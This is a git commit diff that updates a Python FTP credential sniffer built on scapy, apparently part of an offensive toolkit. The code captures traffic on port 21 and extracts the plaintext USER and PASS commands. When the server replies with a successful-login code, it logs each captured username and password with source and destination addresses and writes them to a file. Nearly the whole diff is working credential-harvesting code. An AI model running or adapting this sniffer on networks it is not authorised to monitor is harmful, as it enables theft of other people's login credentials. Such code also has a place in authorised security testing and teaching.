c363ad1790d9cad7038a807af261a3a19976d7ea
ReddyyZ <arthurc.oli.whitehat@gmail.com>
2020-09-20 12:02:55 -0300

    Updates on FTP Sniffer

--- include/sniff_ftp.py
+++ include/sniff_ftp.py
@@ -1,6 +1,17 @@
 from scapy.all import *
 from multiprocessing import Process
-import sys,logging
+from colorama import init, Fore
+import sys,logging,time
+
+white   = Fore.WHITE
+black   = Fore.BLACK
+red     = Fore.RED
+reset   = Fore.RESET
+blue    = Fore.BLUE
+cyan    = Fore.CYAN
+yellow  = Fore.YELLOW
+green   = Fore.GREEN
+magenta = Fore.MAGENTA
 
 class FTPSniff(object):
     x = random.randint(1000,9999)
@@ -10,30 +21,37 @@ class FTPSniff(object):
         self.main_thread = None
         self.usernames   = []
         self.passwords   = []
-        logging.basicConfig(format="%(levelname)s: %(message)s", level=logging.DEBUG if verbose else logging.WARNING)
-		
+        self.addrs       = []
+        
+        init()
+        logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
+        logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
+        logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
+        logging.addLevelName(logging.DEBUG, f"[{cyan}**{reset}]")
+        logging.basicConfig(format=f"%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.WARNING)
+
     def check_login(self, pkt, username, passwd):
-        if '230' in pkt[Raw].load:
-            logging.info(f"FTP Login - USER: {username} PASS: {passwd}")
+        if b'230' in pkt[Raw].load:
             return True
         else:
             return False
 		
     def check_for_ftp(self,pkt):
         if pkt.haslayer(TCP) and pkt.haslayer(Raw):
-            if pkt[TCP].dport == 21 and pkt[TCP].sport == 21:
-                return True
-            else:
-                return False
+            return True
+            # if pkt[TCP].dport == 21 and pkt[TCP].sport == 21:
+            #     return True
+            # else:
+            #     return False
         else:
             return False
 			
     def handle_pkt(self,pkt):
         if not self.check_for_ftp(pkt):
             return
-        
+
         wrpcap(self.pcap_path, pkt)
-        data = pkt[Raw].load
+        data = str(pkt[Raw].load).replace("b","").replace("'","")
 
         if 'USER ' in data:
             user = data.split("USER ")[1].strip()
@@ -41,18 +59,37 @@ class FTPSniff(object):
         elif 'PASS ' in data:
             passwd = data.split("PASS ")[1].strip()
             self.passwords.append(passwd)
+            self.addrs.append((pkt[IP].src,pkt[IP].dst))
         else:
-            if self.check_login(pkt,self.usernames[-1],self.passwords[-1]):
-                with open(self.ftp_file, "a+") as fd:
-                    fd.write(f"FTP - USER: {self.usernames[-1]} PASS: {self.passwords[-1]}")
+            try:
+                if self.check_login(pkt,self.usernames[-1],self.passwords[-1]):
+                    with open(self.ftp_file, "a+") as fd:
+                        user = self.usernames[-1].replace("\r\n","").replace("\\r\\n","")
+                        passwd = self.passwords[-1].replace("\r\n","").replace("\\r\\n","")
+                        fd.write(f" {self.addrs[-1][0]} -> {self.addrs[-1][1]}:\n   Username: {user}\n   Password: {passwd}\n\n")
+                        logging.info(f"{self.addrs[-1][0]} -> {self.addrs[-1][1]}:\n\tUsername: {user}\n\tPassword: {passwd}\n\n")
+            except:
+                pass
 
     def sniff_thread(self):
-        sniff(prn=self.handle_pkt)
+        logging.info("Sniff started")
+        sniff(filter="port 21",prn=self.handle_pkt)
     
     def start(self):
+        logging.info("Starting")
         self.main_thread = Process(target=self.sniff_thread)
         self.main_thread.start()
     
     def stop(self):
         self.main_thread.kill()
         return (self.pcap_path, self.ftp_file)
+
+if __name__ == "__main__":
+    ftp = FTPSniff(verbose=True)
+    ftp.start()
+
+    try:
+        while True:
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print(ftp.stop())
